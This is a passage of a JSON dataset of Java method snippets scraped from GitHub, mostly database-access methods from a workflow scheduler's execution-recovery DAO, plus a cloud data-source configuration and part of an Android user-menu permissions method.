"modifiers": ["public"]}}, {"id": 56171, "method_name": "getHistoryRecoverFlowByPidAndFid", "class_name": "ExecutionRecoverDao", "params": ["String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "ExecutionRecover", "snippet": "  public ExecutionRecover getHistoryRecoverFlowByPidAndFid(final String projectId, final String flowId)\n      throws ExecutorManagerException {\n    String query = \"SELECT recover_id, recover_status, enc_type, recover_data FROM execution_recover_flows \"\n            + \"WHERE project_id = ? AND flow_id = ? \"\n            + \"ORDER BY start_time DESC limit 1\";\n\n    final List<Object> params = new ArrayList<>();\n\n    params.add(projectId);\n\n    params.add(flowId);\n\n    try {\n      List<ExecutionRecover> recoverList = this.dbOperator.query(query, new FetchExecutionRecoverFlows(), params.toArray());\n\n      if(recoverList.size() > 0){\n        return recoverList.get(0);\n      }else {\n        return null;\n      }\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching history recover flows\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56172, "method_name": "listHistoryRecover", "class_name": "ExecutionRecoverDao", "params": ["Map<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutionRecover>", "snippet": "  public List<ExecutionRecover> listHistoryRecover(final Map<String, String> paramMap)\n      throws ExecutorManagerException {\n\n    String query = FetchExecutionRecoverFlows.LIST_BASE_EXECUTABLE_RECOVER_FLOW_QUERY;\n\n    final List<Object> params = new ArrayList<>();\n\n    boolean first = false;\n\n    if(!paramMap.isEmpty()){\n\n      String recoverStatus = MapUtils.getString(paramMap, \"recoverStatus\", \"\");\n\n      if(recoverStatus != null && !recoverStatus.isEmpty()){\n        if (first) {\n          query += \" WHERE \";\n          first = false;\n        } else {\n          query += \" AND \";\n        }\n        query += \"recover_status = ?\";\n        params.add(recoverStatus);\n      }\n\n\n      Integer limitNum = MapUtils.getInteger(paramMap, \"limitNum\", 1);\n\n      if(recoverStatus != null && !recoverStatus.isEmpty()){\n        query += \" ORDER BY recover_id DESC LIMIT ? \";\n        params.add(limitNum);\n      }\n\n    }\n\n    try {\n      return this.dbOperator.query(query, new FetchExecutionRecoverFlows(), params.toArray());\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching history recover flows\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56173, "method_name": "getHistoryRecoverTotal", "class_name": "ExecutionRecoverDao", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getHistoryRecoverTotal()\n      throws ExecutorManagerException {\n    final IntHandler intHandler = new IntHandler();\n    try {\n      return this.dbOperator.query(IntHandler.NUM_EXECUTIONS, intHandler);\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching num executions\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56174, "method_name": "getUserHistoryRecoverTotal", "class_name": "ExecutionRecoverDao", "params": ["String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getUserHistoryRecoverTotal(final String userName)\n      throws ExecutorManagerException {\n    final IntHandler intHandler = new IntHandler();\n\n    final List<Object> params = new ArrayList<>();\n\n    params.add(userName);\n\n    try {\n      return this.dbOperator.query(IntHandler.USER_NUM_EXECUTIONS, intHandler, params.toArray());\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching num executions\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56175, "method_name": "getMaintainedHistoryRecoverTotal", "class_name": "ExecutionRecoverDao", "params": ["String", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getMaintainedHistoryRecoverTotal(String username, List<Integer> maintainedProjectIds) throws ExecutorManagerException {\n    String projectIds = maintainedProjectIds.stream()\n            .map(Objects::toString)\n            .collect(joining(\",\", \"(\", \")\"));\n    String querySQL  = \"SELECT COUNT(1) FROM execution_recover_flows WHERE recover_status = 30 \" +\n            \"AND (project_id in \" + projectIds + \" OR submit_user = ?)\";\n    try {\n      final IntHandler intHandler = new IntHandler();\n      return this.dbOperator.query(querySQL, intHandler, username);\n    } catch (SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching num executions\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56176, "method_name": "fetchHistoryRecover", "class_name": "ExecutionRecoverDao", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutionRecover>", "snippet": "  public List<ExecutionRecover> fetchHistoryRecover()\n          throws ExecutorManagerException {\n    final FetchExecutionRecoverFlows fetchExecutionRecoverFlows = new  FetchExecutionRecoverFlows();\n    try {\n      return this.dbOperator.query(FetchExecutionRecoverFlows.IS_NOT_FINISH_RECOVER, fetchExecutionRecoverFlows);\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching num executions\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56177, "method_name": "getExecHistoryTotal", "class_name": "ExecutionRecoverDao", "params": ["Map<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecHistoryTotal(final Map<String, String> filterMap)\n      throws ExecutorManagerException {\n    final IntHandler intHandler = new IntHandler();\n\n    final List<Object> params = new ArrayList<>();\n\n    StringBuilder historyTotalSql = new StringBuilder(\"SELECT COUNT(1) FROM execution_flows ef JOIN projects p ON ef.project_id = p.id\");\n\n    boolean first = true;\n    //\u641c\u7d22\u6240\u6709\u7684\u6267\u884c\u5386\u53f2\u6570\u636e\u6761\u6570\n    if (null != filterMap.get(\"userContains\")) {\n      first = wrapperSqlParam(first, filterMap, \"userContains\", null,\"submit_user\", \"like\", historyTotalSql, params);\n    }\n    //\u641c\u7d22flow\u540d\u5b57\u7c7b\u4f3c\u7684\u6267\u884c\u5386\u53f2\u6570\u636e\u6761\u6570\n    if (null != filterMap.get(\"flowContains\")) {\n      first = wrapperSqlParam(first, filterMap, \"flowContains\", null,\"flow_id\", \"like\", historyTotalSql, params);\n\n      first = wrapperSqlParam(first, filterMap, \"userName\", null,\"submit_user\", \"=\", historyTotalSql, params);\n\n    }\n    //\u6309\u7167\u8fc7\u6ee4\u6761\u4ef6\u641c\u7d22\u6267\u884c\u5386\u53f2\u6570\u636e\u6761\u6570\n    if (null != filterMap.get(\"filterContains\")) {\n      if (filterMap.get(\"projContain\") != null && !filterMap.get(\"projContain\").isEmpty()) {\n        first = wrapperSqlParam(first, filterMap, \"projContain\", null,\"name\", \"like\", historyTotalSql, params);\n      }\n\n      // todo kunkun-tang: we don't need the below complicated logics. We should just use a simple way.\n      if (filterMap.get(\"flowContain\") != null && !filterMap.get(\"flowContain\").isEmpty()) {\n        first = wrapperSqlParam(first, filterMap, \"flowContain\", null,\"flow_id\", \"like\", historyTotalSql, params);\n      }\n\n      if (Integer.valueOf(filterMap.get(\"status\")) != 0) {\n        first = wrapperSqlParam(first, filterMap, \"status\", \"int\",\"status\", \"=\", historyTotalSql, params);\n      }\n\n      if (!\"-1\".equals(filterMap.get(\"beginTime\"))) {\n        first = wrapperSqlParam(first, filterMap, \"beginTime\", \"long\",\"start_time\", \">\", historyTotalSql, params);\n      }\n\n      if (!\"-1\".equals(filterMap.get(\"endTime\"))) {\n        first = wrapperSqlParam(first, filterMap, \"endTime\", \"long\",\"end_time\", \"<\", historyTotalSql, params);\n      }\n\n      if(null != filterMap.get(\"userContain\") && !filterMap.get(\"userContain\").isEmpty()){\n        first = wrapperSqlParam(first, filterMap, \"userContain\", null,\"submit_user\", \"like\", historyTotalSql, params);\n      }\n\n\n      if (!\"-1\".equals(filterMap.get(\"flowType\"))) {\n        first = wrapperSqlParam(first, filterMap, \"flowType\", \"int\",\"flow_type\", \"like\", historyTotalSql, params);\n      }\n    }\n\n    try {\n      return this.dbOperator.query(historyTotalSql.toString(), intHandler, params.toArray());\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching num executions\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56178, "method_name": "getExecHistoryTotal", "class_name": "ExecutionRecoverDao", "params": ["String", "Map<String,String>", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecHistoryTotal(String username, final Map<String, String> filterMap, List<Integer> projectIds)\n          throws ExecutorManagerException {\n    final IntHandler intHandler = new IntHandler();\n\n    final List<Object> params = new ArrayList<>();\n    String projectIdsStr = projectIds.stream()\n            .map(Object::toString)\n            .collect(joining(\",\", \"(\", \")\"));\n    StringBuilder historyTotalSql = new StringBuilder(\"SELECT COUNT(1) FROM execution_flows ef, projects p \"\n            + \"WHERE ef.project_id = p.id \"\n            + \"AND ef.project_id IN \" + projectIdsStr);\n    boolean first = false;\n    //\u641c\u7d22\u6240\u6709\u7684\u6267\u884c\u5386\u53f2\u6570\u636e\u6761\u6570\n    if (null != filterMap.get(\"userContains\")) {\n      first = wrapperSqlParam(first, filterMap, \"userContains\", null,\"submit_user\", \"like\", historyTotalSql, params);\n    }\n    //\u641c\u7d22flow\u540d\u5b57\u7c7b\u4f3c\u7684\u6267\u884c\u5386\u53f2\u6570\u636e\u6761\u6570\n    if (null != filterMap.get(\"flowContains\")) {\n      first = wrapperSqlParam(first, filterMap, \"flowContains\", null,\"flow_id\", \"like\", historyTotalSql, params);\n\n      first = wrapperSqlParam(first, filterMap, \"userName\", null,\"submit_user\", \"=\", historyTotalSql, params);\n\n    }\n    //\u6309\u7167\u8fc7\u6ee4\u6761\u4ef6\u641c\u7d22\u6267\u884c\u5386\u53f2\u6570\u636e\u6761\u6570\n    if (null != filterMap.get(\"filterContains\")) {\n      if (filterMap.get(\"projContain\") != null && !filterMap.get(\"projContain\").isEmpty()) {\n        first = wrapperSqlParam(first, filterMap, \"projContain\", null,\"p.name\", \"like\", historyTotalSql, params);\n      }\n\n      // todo kunkun-tang: we don't need the below complicated logics. We should just use a simple way.\n      if (filterMap.get(\"flowContain\") != null && !filterMap.get(\"flowContain\").isEmpty()) {\n        first = wrapperSqlParam(first, filterMap, \"flowContain\", null,\"flow_id\", \"like\", historyTotalSql, params);\n      }\n\n      if (Integer.valueOf(filterMap.get(\"status\")) != 0) {\n        first = wrapperSqlParam(first, filterMap, \"status\", \"int\",\"status\", \"=\", historyTotalSql, params);\n      }\n\n      if (!\"-1\".equals(filterMap.get(\"beginTime\"))) {\n        first = wrapperSqlParam(first, filterMap, \"beginTime\", \"long\",\"start_time\", \">\", historyTotalSql, params);\n      }\n\n      if (!\"-1\".equals(filterMap.get(\"endTime\"))) {\n        first = wrapperSqlParam(first, filterMap, \"endTime\", \"long\",\"end_time\", \"<\", historyTotalSql, params);\n      }\n\n      if(null != filterMap.get(\"userContain\") && !filterMap.get(\"userContain\").isEmpty()){\n        first = wrapperSqlParam(first, filterMap, \"userContain\", null,\"submit_user\", \"like\", historyTotalSql, params);\n      }\n\n\n      if (!\"-1\".equals(filterMap.get(\"flowType\"))) {\n        first = wrapperSqlParam(first, filterMap, \"flowType\", \"int\",\"flow_type\", \"like\", historyTotalSql, params);\n      }\n    }\n\n    try {\n      return this.dbOperator.query(historyTotalSql.toString(), intHandler, params.toArray());\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching num executions\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56179, "method_name": "getMaintainedExecHistoryTotal", "class_name": "ExecutionRecoverDao", "params": ["String", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getMaintainedExecHistoryTotal(String username, List<Integer> projectIds) throws ExecutorManagerException {\n    String projectIdsStr = projectIds.stream()\n            .map(Object::toString)\n            .collect(joining(\",\", \"(\", \")\"));\n    String querySQL = \"SELECT COUNT(1) \" +\n            \"FROM execution_flows ef, projects p \" +\n            \"WHERE ef.project_id = p.id \" +\n            \"AND ef.project_id IN \" + projectIdsStr;\n    try {\n      ResultSetHandler<Integer> handler = rs -> rs.next()? rs.getInt(1): 0;\n      return this.dbOperator.query(querySQL, handler);\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching num executions\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56180, "method_name": "getExecHistoryQuickSerachTotal", "class_name": "ExecutionRecoverDao", "params": ["Map<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecHistoryQuickSerachTotal(final Map<String, String> filterMap)\n      throws ExecutorManagerException {\n    final IntHandler intHandler = new IntHandler();\n\n    final List<Object> params = new ArrayList<>();\n\n    String historyTotalSql = \"SELECT COUNT(1) FROM execution_flows ef JOIN projects p ON ef.project_id = p.id\";\n\n    boolean first = true;\n    //\u641c\u7d22flow\u540d\u5b57\u7c7b\u4f3c\u7684\u6267\u884c\u5386\u53f2\u6570\u636e\u6761\u6570\n    if (null != filterMap.get(\"flowContains\")) {\n      if (first) {\n        historyTotalSql += \" WHERE \";\n        first = false;\n      } else {\n        historyTotalSql += \" AND \";\n      }\n      historyTotalSql += \" (exec_id LIKE ? OR flow_id LIKE ? OR name LIKE ?) \";\n      params.add('%' + filterMap.get(\"flowContains\") + '%');\n      params.add('%' + filterMap.get(\"flowContains\") + '%');\n      params.add('%' + filterMap.get(\"flowContains\") + '%');\n      first = false;\n      if(null != filterMap.get(\"flowUser\")){\n        historyTotalSql += \" AND submit_user = ?\";\n        params.add(filterMap.get(\"flowUser\"));\n        first = false;\n      }\n    }\n\n    try {\n      return this.dbOperator.query(historyTotalSql, intHandler, params.toArray());\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching num executions\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56181, "method_name": "getMaintainedFlowsQuickSearchTotal", "class_name": "ExecutionRecoverDao", "params": ["String", "Map<String,String>", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getMaintainedFlowsQuickSearchTotal(String username, final Map<String, String> filterMap, List<Integer> projectIds)\n          throws ExecutorManagerException {\n    final IntHandler intHandler = new IntHandler();\n\n    final List<Object> params = new ArrayList<>();\n    String projectIdsStr = projectIds.stream()\n            .map(Object::toString)\n            .collect(joining(\",\", \"(\", \")\"));\n    String historyTotalSql = \"SELECT COUNT(1) FROM execution_flows ef, projects p \"\n            + \"WHERE ef.project_id = p.id \"\n            + \"AND ef.project_id IN \" + projectIdsStr + \" \";\n    boolean first = false;\n    //\u641c\u7d22flow\u540d\u5b57\u7c7b\u4f3c\u7684\u6267\u884c\u5386\u53f2\u6570\u636e\u6761\u6570\n    if (null != filterMap.get(\"flowContains\")) {\n      if (first) {\n        historyTotalSql += \" WHERE \";\n        first = false;\n      } else {\n        historyTotalSql += \" AND \";\n      }\n      historyTotalSql += \" (ef.exec_id LIKE ? OR ef.flow_id LIKE ? OR p.name LIKE ?) \";\n      params.add('%' + filterMap.get(\"flowContains\") + '%');\n      params.add('%' + filterMap.get(\"flowContains\") + '%');\n      params.add('%' + filterMap.get(\"flowContains\") + '%');\n      first = false;\n      if(null != filterMap.get(\"flowUser\")){\n        historyTotalSql += \" AND submit_user = ?\";\n        params.add(filterMap.get(\"flowUser\"));\n        first = false;\n      }\n    }\n\n    try {\n      return this.dbOperator.query(historyTotalSql, intHandler, params.toArray());\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching num executions\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56182, "method_name": "getUserExecHistoryTotal", "class_name": "ExecutionRecoverDao", "params": ["Map<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getUserExecHistoryTotal(final Map<String, String> filterMap)\n      throws ExecutorManagerException {\n    final IntHandler intHandler = new IntHandler();\n\n    final List<Object> params = new ArrayList<>();\n\n    StringBuilder historyTotalSql = new StringBuilder( \"SELECT COUNT(1) FROM execution_flows ef, projects p, project_permissions pp \"\n            + \"WHERE ef.project_id = p.id AND ef.project_id = pp.project_id \"\n            + \"AND pp.name=? \");\n\n    params.add(filterMap.get(\"userName\"));\n\n    boolean first = false;\n    //\u641c\u7d22\u6240\u6709\u7684\u6267\u884c\u5386\u53f2\u6570\u636e\u6761\u6570\n    if (null != filterMap.get(\"userContains\")) {\n      wrapperSqlParam(first,filterMap,\"userContains\", null,\"submit_user\", \"=\",historyTotalSql,params);\n    }\n\n    //\u641c\u7d22flow\u540d\u5b57\u7c7b\u4f3c\u7684\u6267\u884c\u5386\u53f2\u6570\u636e\u6761\u6570\n    if (null != filterMap.get(\"flowContains\")) {\n      wrapperSqlParam(first, filterMap, \"flowContains\", null,\"flow_id\", \"like\", historyTotalSql, params);\n\n      if(null != filterMap.get(\"userName\")){\n        wrapperSqlParam(first, filterMap, \"userName\", null,\"submit_user\", \"=\", historyTotalSql, params);\n      }\n    }\n\n    //\u641c\u7d22execId\u7c7b\u4f3c\u7684\u6267\u884c\u5386\u53f2\u6570\u636e\u6761\u6570\n    if (null != filterMap.get(\"execIdContain\")) {\n      wrapperSqlParam(first, filterMap, \"execIdContain\", null,\"exec_id\", \"like\", historyTotalSql, params);\n      if(null != filterMap.get(\"userName\")){\n        wrapperSqlParam(first, filterMap, \"userName\", null,\"submit_user\", \"=\", historyTotalSql, params);\n      }\n    }\n\n    //\u6309\u7167\u8fc7\u6ee4\u6761\u4ef6\u641c\u7d22\u6267\u884c\u5386\u53f2\u6570\u636e\u6761\u6570\n    if (null != filterMap.get(\"filterContains\")) {\n      if (filterMap.get(\"projContain\") != null && !filterMap.get(\"projContain\").isEmpty()) {\n        wrapperSqlParam(first, filterMap, \"projContain\", null,\"p.name\", \"like\", historyTotalSql, params);\n      }\n\n      // todo kunkun-tang: we don't need the below complicated logics. We should just use a simple way.\n      if (filterMap.get(\"flowContain\") != null && !filterMap.get(\"flowContain\").isEmpty()) {\n        wrapperSqlParam(first, filterMap, \"flowContain\", null,\"flow_id\", \"like\", historyTotalSql, params);\n      }\n\n      if (Integer.valueOf(filterMap.get(\"status\")) != 0) {\n        wrapperSqlParam(first, filterMap, \"status\", \"int\",\"status\", \"=\", historyTotalSql, params);\n      }\n\n      if (!\"-1\".equals(filterMap.get(\"beginTime\"))) {\n        wrapperSqlParam(first, filterMap, \"beginTime\", \"long\", \"start_time\", \">\", historyTotalSql, params);\n      }\n\n      if (!\"-1\".equals(filterMap.get(\"endTime\"))) {\n        wrapperSqlParam(first, filterMap, \"endTime\", \"long\",\"end_time\", \"<\", historyTotalSql, params);\n      }\n\n      if(null != filterMap.get(\"userContain\") && !filterMap.get(\"userContain\").isEmpty()){\n        wrapperSqlParam(first, filterMap, \"userContain\", null,\"submit_user\", \"like\", historyTotalSql, params);\n      }\n\n\n      if (!\"-1\".equals(filterMap.get(\"flowType\"))) {\n        wrapperSqlParam(first, filterMap, \"flowType\", \"int\",\"flow_type\", \"=\", historyTotalSql, params);\n      }\n    }\n\n    try {\n      return this.dbOperator.query(historyTotalSql.toString(), intHandler, params.toArray());\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching num executions\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56183, "method_name": "wrapperSqlParam", "class_name": "ExecutionRecoverDao", "params": ["boolean", "Map<String,String>", "String", "String", "String", "String", "StringBuilder", "List<Object>"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean wrapperSqlParam(boolean firstParam, Map<String, String> filterMap, String param, String parseType, String dbColumnName,\n                               String action, StringBuilder querySql, List<Object> params) {\n      if (firstParam) {\n        querySql.append(\" WHERE \");\n        firstParam = false;\n      } else {\n        querySql.append(\" AND \");\n      }\n      querySql.append(\" \").append(dbColumnName).append(\" \").append(action).append(\" ?\");\n\n      if (action.equalsIgnoreCase(\"like\")) {\n        params.add('%' + filterMap.get(param) + '%');\n      } else {\n        // \u5224\u65ad\u662f\u5426\u9700\u8981\u8f6c\u6362\u7c7b\u578b\n        if (parseType == null) {\n          params.add(filterMap.get(param));\n          // \u9700\u8981\u8f6c\u6362\u4e3aint\u7c7b\u578b\n        } else if (\"int\".equalsIgnoreCase(parseType)) {\n          params.add(Integer.valueOf(filterMap.get(param)));\n        } else if (\"long\".equalsIgnoreCase(parseType)) {\n          params.add(Long.valueOf(filterMap.get(param)));\n        }\n      }\n    return firstParam;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56184, "method_name": "getUserExecHistoryQuickSerachTotal", "class_name": "ExecutionRecoverDao", "params": ["Map<String,String>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getUserExecHistoryQuickSerachTotal(final Map<String, String> filterMap)\n      throws ExecutorManagerException {\n    final IntHandler intHandler = new IntHandler();\n\n    final List<Object> params = new ArrayList<>();\n\n    String historyTotalSql = \"SELECT COUNT(1) FROM execution_flows ef, projects p, project_permissions pp \"\n        + \"WHERE ef.project_id = p.id AND ef.project_id = pp.project_id \"\n        + \"AND pp.name=? \";\n\n    params.add(filterMap.get(\"userName\"));\n\n    boolean first = false;\n    //\u641c\u7d22flow\u540d\u5b57\u7c7b\u4f3c\u7684\u6267\u884c\u5386\u53f2\u6570\u636e\u6761\u6570\n    if (null != filterMap.get(\"flowContains\")) {\n      if (first) {\n        historyTotalSql += \" WHERE \";\n        first = false;\n      } else {\n        historyTotalSql += \" AND \";\n      }\n      historyTotalSql += \" (ef.exec_id LIKE ? OR ef.flow_id LIKE ? OR p.name LIKE ?) \";\n      params.add('%' + filterMap.get(\"flowContains\") + '%');\n      params.add('%' + filterMap.get(\"flowContains\") + '%');\n      params.add('%' + filterMap.get(\"flowContains\") + '%');\n      first = false;\n      if(null != filterMap.get(\"flowUser\")){\n        historyTotalSql += \" AND submit_user = ?\";\n        params.add(filterMap.get(\"flowUser\"));\n        first = false;\n      }\n    }\n\n    try {\n      return this.dbOperator.query(historyTotalSql, intHandler, params.toArray());\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Error fetching num executions\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56185, "method_name": "handle", "class_name": "FetchExecutionRecoverFlows", "params": ["ResultSet"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "List<ExecutionRecover>", "snippet": "    public List<ExecutionRecover> handle(final ResultSet rs) throws SQLException {\n      if (!rs.next()) {\n        return Collections.emptyList();\n      }\n\n      final List<ExecutionRecover> execFlows = new ArrayList<>();\n      do {\n        final int id = rs.getInt(1);\n        final int status = rs.getInt(2);\n        final int encodingType = rs.getInt(3);\n        final byte[] data = rs.getBytes(4);\n\n        if (data != null) {\n          final EncodingType encType = EncodingType.fromInteger(encodingType);\n          final Object flowObj;\n\n          /**\n           * The below code is a duplicate against many places, like azkaban.database.EncodingType\n           * TODO kunkun-tang: Extract these duplicates to a single static method.\n           */\n          try {\n            // Convoluted way to inflate strings. Should find common package\n            // or helper function.\n            if (encType == EncodingType.GZIP) {\n              // Decompress the sucker.\n              final String jsonString = GZIPUtils.unGzipString(data, \"UTF-8\");\n              flowObj = JSONUtils.parseJSONFromString(jsonString);\n            } else {\n              final String jsonString = new String(data, \"UTF-8\");\n              flowObj = JSONUtils.parseJSONFromString(jsonString);\n            }\n\n            final ExecutionRecover exFlow =\n                ExecutionRecover.createExecutionRecoverFromObject(flowObj);\n            exFlow.setRecoverStatus(Status.fromInteger(status));\n            execFlows.add(exFlow);\n          } catch (final IOException e) {\n            throw new SQLException(\"Error retrieving History Recover data \" + id, e);\n          }\n        }\n      } while (rs.next());\n\n      return execFlows;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": ["ResultSetHandler"], "modifiers": ["public", "static"]}}, {"id": 56186, "method_name": "handle", "class_name": "IntHandler", "params": ["ResultSet"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer handle(final ResultSet rs) throws SQLException {\n      if (!rs.next()) {\n        return 0;\n      }\n      return rs.getInt(1);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/executor/ExecutionRecoverDao.java", "stars": "18", "class_props": {"extends": null, "implements": ["ResultSetHandler"], "modifiers": ["static", "private"]}}, {"id": 56187, "method_name": "dataSource", "class_name": "CloudDatabaseConfiguration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DataSource", "snippet": "    public DataSource dataSource() {\n        log.info(\"Configuring JDBC datasource from a cloud provider\");\n        return connectionFactory().dataSource();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/config/CloudDatabaseConfiguration.java", "stars": "2", "class_props": {"extends": "AbstractCloudConfig", "implements": null, "modifiers": ["public"]}}, {"id": 56188, "method_name": "onMenuPrepare", "class_name": "UserMenu", "params": ["Menu", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onMenuPrepare(Menu menu, int permissions) {\n        // Use permission data to determine the actions available.\n        boolean self = mUser.getSession() == mService.getSessionId();\n        int perms = mService.getPermissions();\n        IChannel channel = mUser.getChannel();\n        int channelPerms = channel.getId() != 0 ? channel.getPermissions() : perms;\n\n        menu.findItem(R.id.context_kick).setVisible(\n                !self && (perms & (Permissions.Kick | Permissions.Ban | Permissions.Write)) > 0);\n        menu.findItem(R.id.context_ban).setVisible(\n                !self && (perms & (Permissions.Ban | Permissions.Write)) > 0);\n        menu.findItem(R.id.context_mute).setVisible(\n                ((channelPerms & (Permissions.Write | Permissions.MuteDeafen)) > 0 &&\n                        (!self || mUser.isMuted() || mUser.isSuppressed())));\n        menu.findItem(R.id.context_deafen).setVisible(\n                ((channelPerms & (Permissions.Write | Permissions.MuteDeafen)) > 0 &&\n                        (!self || mUser.isDeafened())));\n        menu.findItem(R.id.context_priority).setVisible(\n                ((channelPerms & (Permissions.Write | Permissions.MuteDeafen)) > 0));\n        menu.findItem(R.id.context_move).setVisible(\n                !self && (perms & Permissions.Move) > 0);\n        menu.findItem(R.id.context_change_comment).setVisible(self);\n        menu.findItem(R.id.context_reset_comment).setVisible(\n                !self && mUser.getCommentHash() != null &&\n                        (perms & (Permissions.Move | Permissions.Write)) > 0);\n        menu.findItem(R.id.context_view_comment).setVisible(\n                (mUser.getComment() != null && !mUser.getComment().isEmpty()) ||\n                        (mUser.getCommentHash() != null));\n        menu.findItem(R.id.context_register).setVisible(mUser.getUserId() < 0 &&\n                (mUser.getHash() != null && !mUser.getHash().isEmpty()) &&\n                (perms & ((self ? Permissions.SelfRegister : Permissions.Register) | Permissions.Write)) > 0);\n        